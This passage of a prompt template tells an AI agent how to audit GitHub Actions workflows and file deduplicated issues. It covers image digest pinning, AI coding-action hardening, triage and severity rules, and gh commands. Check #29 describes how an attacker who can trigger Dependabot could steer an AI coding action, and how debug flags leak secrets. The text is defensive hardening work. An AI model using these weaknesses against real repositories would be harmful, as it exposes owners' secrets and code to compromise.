executing attacker code with the job's secrets and `GITHUB_TOKEN`.

25. **Container image referenced by a mutable tag.** Flag a container
    image pulled by tag rather than a `@sha256:` digest in any of these
    four surfaces:

    - **Docker container actions** — `uses: docker://<registry>/<img>:<tag>`
      (e.g. `uses: docker://ghcr.io/owner/img:1.2`).
    - **Job-level container** — a job's `container:` key, either the
      string form `container: img:tag` or the mapping form
      `container: { image: img:tag }`.
    - **Service containers** — each entry under a job's `services:` map,
      e.g. `services: { db: { image: postgres:16 } }`.
    - **Composite / Docker action `Dockerfile`** — a `FROM <img>:<tag>`
      (or bare `FROM <img>`, which resolves to `:latest`) line in a
      `Dockerfile` under `.github/actions/**`.

    Cite the file path and the line range of the offending reference.

    **First-party carve-out.** First-party `ghcr.io/stsoftwareau/*`
    images may follow the same first-party carve-out as `stSoftwareAU/*`
    actions — a tag pin on a `ghcr.io/stsoftwareau/*` image is not a
    finding. Every third-party image must pin to a `@sha256:` digest.

    **No false positives on already-digest-pinned images.** An image
    already pinned by digest — `postgres:16@sha256:…` or
    `ghcr.io/owner/img@sha256:…` — is the hardened form; do not flag it.
    The human-readable tag may appear alongside the digest.

    **Suggested fix — pin to the digest.** Pin the image to its current
    `@sha256:` digest and keep the human-readable tag in a comment for
    traceability:

    ```yaml
    services:
      db:
        # postgres:16
        image: postgres:16@sha256:<digest>
    ```

    **Severity.**

    - `severity:medium` — the base band, mirroring the action-pinning
      hardening rules (#1, #13, #16). A mutable image pin in a job that
      does not run under a privileged trigger or hold org-wide secrets.
    - `severity:high` — when the image runs with secrets under a
      **privileged trigger** (the #6 family — `pull_request_target`,
      `workflow_run`, `issue_comment`, `issues`, `discussion`,
      `discussion_comment`). A swapped image then executes attacker code
      with the job's secrets and a write `GITHUB_TOKEN`.

    **Stable id.** Generic `BP-<12 hex>` recipe — no special prefix.

### AI coding-action hardening (Wiz Pt 2, Issue #2413)

29. **AI coding-action misconfiguration leaking secrets or accepting over-broad
    input trust.** Workflows that invoke AI coding actions — including
    `anthropics/claude-code-action`, `google-gemini/run-gemini-cli`,
    and similar LLM-driven automation actions — carry two distinct hardening
    gaps:

    **a. Secret-leaking debug / verbosity flags.** Certain action inputs
    cause the action to print full prompt context, tool call payloads, or
    session transcripts to the runner log. These often include secrets
    injected through `env:` vars or the `GITHUB_TOKEN`:

    - `show_full_output: true` on `claude-code-action` outputs the entire
      Claude session to the log, including any secrets present in the
      environment.
    - `gemini_debug: true` or `GEMINI_DEBUG: 1` on `run-gemini-cli` dumps
      the Gemini API request/response bodies, which may contain secrets
      passed via `env:`.

    Flag any workflow that passes a debug/verbosity flag to an AI coding
    action in a job that also has secrets (`secrets.*`, `GITHUB_TOKEN`, or
    `id-token: write`) in scope.

    **b. Over-broad input trust: bots and dependabot in the trusted zone.**
    AI coding actions with a `trusted-users` / `allow-bot-users` /
    `trigger-phrase` model may trust `dependabot[bot]`, `renovate[bot]`, or
    the wildcard `bot` in their allowed-caller list. An attacker who can trigger
    Dependabot (e.g. by landing a malicious transitive dependency) can then
    steer the AI coding action with full trusted-caller privileges, including
    the ability to create PRs with elevated permissions. Flag any workflow that
    grants bot or dependabot identities the same trust level as human
    collaborators via an `allow-bot-users` or equivalent input.

    Cite the workflow file, the AI coding-action step, and the specific input
    that creates the risk.

    **Stable id.** Generic `BP-<12 hex>` recipe — no special prefix.

    **Severity.**

    - `severity:high` when a debug/verbosity flag leaks secrets that are in
      scope for the job — the runner log or Gemini API dump captures live
      credential material.
    - `severity:medium` when the only concern is over-broad input trust
      (bots/dependabot in the trusted zone) — exploitability requires a
      supply-chain foothold first.

    **Suggested fix.**

    - Remove `show_full_output: true` / `gemini_debug: true` from production
      workflows. If debug output is needed, run the action in a dedicated
      workflow with no secrets in scope and review locally.
    - Replace a wildcard bot trust list with an explicit human collaborator
      list. Use `allow-bot-users: false` (or the action's equivalent) and
      check that `dependabot[bot]` is not included in any trusted-users
      enumeration. If Dependabot PRs must trigger the action, add a
      separate, minimal-scope workflow that validates the Dependabot PR before
      dispatching the coding action.

## Phase 3 — Triage

Apply these rules in order to every candidate from Phase 2:

1. **Drop unbacked candidates.** If a finding lacks a concrete
   file/lines citation that demonstrates the concern, drop it.
2. **Deduplicate by root cause.** When two candidates share the same
   root cause (same anti-pattern repeated across files), collapse them
   into one finding whose body lists the call sites.
3. **Drop suppressed and known-open findings.** Drop any candidate whose
   stable id appears in either the suppressed list or the known-open
   list declared in the **Inputs** section above.
4. **Drop in-source suppressions.** If the file at `<file>:<first-line>`
   has a host-language suppression comment of the form
   `# best-practice-ignore: BP-…`, `// best-practice-ignore: BP-…`, or
   any other marker recognised by
   `worker/deno/lib/suppression_comments.ts` whose id matches, drop the
   finding.
5. **Sort surviving findings.** High → Medium → Low; within each
   severity, sort by ease of fix (easiest concrete improvement first).
6. **Apply the hard cap.** Keep at most **6 findings**. If more than 6
   survive, file the top 6 in priority order
   (`severity:high` > `severity:medium` > `severity:low`).

### Severity guidance

- **`severity:high`** — active supply-chain or privilege-escalation risk
  (unpinned third-party action, checkout or execution of an
  attacker-controllable ref/input under a **privileged trigger** —
  `pull_request_target`, `workflow_run`, `issue_comment`, `issues`,
  `discussion`, `discussion_comment` — without an author/association
  guard, third-party Action invoked under a privileged trigger,
  org-wide secret exposed to PR-controlled code, `id-token: write`
  granted too broadly, **self-hosted runner reachable from an
  untrusted trigger** — forked `pull_request`, `pull_request_target`,
  `workflow_run`, or a comment/issue event — without a same-repo guard
  and ephemeral runner config, **PWN-request** poisoned-pipeline RCE
  chain (check #26), **secret exfiltration** via `toJson(secrets)` dumps
  or artefacts (check #27), AI coding-action debug flag leaking secrets
  (check #29 high band)).
- **`severity:medium`** — a hardening gap that is not directly
  exploitable but weakens the posture (missing `permissions:` block,
  missing `timeout-minutes`, EOL runtime, stale action major,
  missing concurrency on a pile-up-prone workflow, a privileged
  trigger declared without a justification comment, **self-hosted
  runner on `push` / `schedule` / `workflow_dispatch` only** without
  ephemeral runner config — ephemerality and least-privilege hygiene,
  **action cache poisoning** via fork-writable cache consumed by a
  privileged run (check #28), over-broad AI coding-action input trust
  (check #29 medium band)).
- **`severity:low`** — advisory hygiene (duplicate logical check,
  obsolete ref, deprecated action, copy-paste block) that does not block
  merges.

## Stable finding ID recipe

For checks **without** a specific-prefix id (the base checks #1–#8, the
supply-chain checks #9–#15, the script-injection check #22, the
self-hosted runner check #23, the `secrets: inherit` check #24, the
container-image pinning check #25, the PWN-request check #26, the
secret-exfiltration check #27, the cache-poisoning check #28, and the
AI-coding-action check #29), compute the stable id as
`BP-<12 hex>` from the inputs

```
{ repo, "github-actions-audit", slug-of-title, primary file }
```

The literal `"github-actions-audit"` discriminator is required so these
ids never collide with best-practices findings for the same file/title
(mirrors the test-audit pattern). Treat whitespace and identifier
renames as equivalent when normalising so the same root cause yields the
same id across runs. The `slug-of-title` is the finding title lower-cased
with non-alphanumeric runs replaced by `-`.

The specific-prefix checks keep their existing id shapes for dedup
back-compatibility with findings filed by the old best-practices
`github-actions` bucket:

- `BP-STALE-ACTION-<owner>-<action>` (check #16)
- `BP-EOL-RUNTIME-<runtime>-<version>` (check #17)
- `BP-OBSOLETE-STEP-<owner>-<action>` (check #18)
- `BP-DUP-IN-FILE-<12 hex>` (check #19)
- `BP-DUP-XFILE-<12 hex>` (check #20)
- `BP-OBSOLETE-REF-<12 hex>` (check #21)

## Phase 4 — File one issue per finding (outcome-only)

This phase is **outcome-only**. The deliverable is a set of GitHub
issues filed against the current repository — one per surviving finding.
Do not emit a fenced JSON block, do not emit a Markdown summary, do not
emit any executive overview, listing-of-findings, coverage-map, or
follow-up-scans sections. The executor verifies success by diffing the
repo's open `github-actions-audit`-labelled issues before and after the
run.

The current working directory is the cloned repository, so every `gh`
invocation operates on the right repo without an explicit `--repo`
argument.

### Defensive label creation

Before filing the first finding, ensure the labels exist. Run:

```
gh label create github-actions-audit --description "GitHub Actions audit finding" --color B60205 || true
gh label create severity:high        --description "High severity"                --color B60205 || true
gh label create severity:medium      --description "Medium severity"              --color D93F0B || true
gh label create severity:low         --description "Low severity"                 --color FBCA04 || true
```

The `|| true` swallows the "already exists" error so re-runs are safe.

### For each surviving finding

1. **Re-check the dedup lists** declared in the **Inputs** section. Skip
   the finding silently if its stable id appears in either the
   suppressed list or the known-open list.
2. **Re-check the live open-issue list.** Before filing, call
   `gh issue list --state open --label github-actions-audit --search "BP- in:body"
   --json number,body --limit 200` and inspect each body for the
   `<!-- finding-id: BP-… -->` marker. Skip any finding whose id already
   has an open issue.
3. **File the issue.** Call `gh issue create` (no `--repo` argument)
   with these labels:
   - `github-actions-audit` (always)
   - `severity:high` | `severity:medium` | `severity:low` (exactly one,
     matching the triaged severity)

   Each finding has the following required fields:

   - **id** — the stable id from the recipe above; used for dedup and
     for in-source `best-practice-ignore` markers.
   - **severity** — exactly one of `high`, `medium`, `low`.
   - **title** — short, human-readable description of the improvement,
     prefixed with a severity emoji (`🟠` high, `🟡` medium, `🟢` low).
     Example:
     `🟠 Pin third-party action to a SHA in .github/workflows/ci.yml:42`.
   - **body** — Markdown. Must contain:
     - The hidden HTML marker `<!-- finding-id: <id> -->` on its own
       line at the top.
     - A prose lead naming the file, line(s), and severity.
     - A `## Why this matters` section (one paragraph of rationale).
     - A `## Suggested fix` section (concrete diff-shaped suggestion
       where possible — and the Deno-coordination lead for checks #16
       and #17 when the repo is a Deno repo).
     - The literal **attribution footer** line from the
       `{{ATTRIBUTION_FOOTER}}` placeholder declared in the **Inputs**
       section as the **final line** of the body, separated from the
       prose above by a blank line. The footer is verbatim — do not
       rephrase it, do not strip the backticks, do not drop the emoji.
       Example of a rendered footer line:
       `🏷️ Filed by idle-task template: \`github-actions-audit\` · Run id: \`vibe-abc123\``.
       Every `gh issue create --body` value MUST end with the line
       supplied in `{{ATTRIBUTION_FOOTER}}` so each finding traces back
       to the run that produced it.

4. **Cap at 6 issues.** Never file more than 6 issues from a single run.
   The cap is hard. If more than 6 candidates survive triage, silently
   drop the lowest-priority surplus — do not file an overflow tracker.
5. **Zero surviving findings = file nothing.** If triage leaves no
   findings, do nothing in Phase 4 — do not file an "all clear" issue,
   do not post a comment, simply exit.

### Required label set

The filer attaches **only** these labels — never an operational workflow
label.

- `github-actions-audit`
- one of `severity:high|severity:medium|severity:low`

### Verification before exit

Before exiting Phase 4, verify your own work:

- The number of `gh issue create` calls is at most 6.
- Every filed issue carries `github-actions-audit` and exactly one
  `severity:*` label.
- No filed issue carries any operational label (`planning`, `work-on`,
  `top-priority`, etc.).
- No finding listed in the suppressed list or the known-open list (see
  the **Inputs** section) was filed.
- Every filed issue body ends with the attribution footer line supplied
  in `{{ATTRIBUTION_FOOTER}}` for this template, verbatim.

If any of these checks fail, fix the offending issue with
`gh issue edit` before exiting.
